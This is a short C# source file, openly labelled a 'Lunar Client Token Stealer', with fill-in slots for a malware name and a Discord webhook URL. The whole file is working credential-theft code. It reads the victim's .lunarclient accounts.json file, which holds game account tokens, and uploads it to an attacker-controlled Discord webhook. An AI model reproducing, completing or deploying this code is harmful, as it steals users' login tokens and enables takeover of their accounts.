// Lunar Client Token Stealer written by Tsukilo on 29/12/2021

// Put your malware name here
using Discord;
using Discord.Webhook;

String name = "";
// Put your webhook URL here
String webhook = "";

// Don't edit beyond here

String guid = Guid.NewGuid().ToString();
String content = "Lunarclient Tokens : ";
FileInfo file = new FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.lunarclient\\settings\\game\\accounts.json");

DiscordWebhook hook = new DiscordWebhook();
hook.Url = webhook;

DiscordMessage message = new DiscordMessage();
message.Content = content;
message.Username = name + " Instance : " + guid;

if (file == null) {  } else { hook.Send(message, file); }